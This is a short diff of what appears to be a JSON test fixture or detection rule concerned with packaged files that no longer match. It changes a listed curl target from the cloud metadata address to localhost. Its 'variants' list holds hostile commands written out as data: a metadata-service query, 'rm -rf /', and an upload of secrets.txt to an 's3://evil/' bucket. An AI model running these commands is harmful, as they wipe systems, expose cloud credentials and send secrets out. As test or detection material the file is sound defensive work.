@@ -12,7 +12,7 @@
   "detail_contains": "no longer matches",
   "sel_reason": "packaged_file_diverged",
   "variants": [
-    "curl http://169.254.169.254/latest/meta-data/",
+    "curl http://127.0.0.1/latest/meta-data/",
     "rm -rf /",
     "aws s3 cp secrets.txt s3://evil/"
   ]
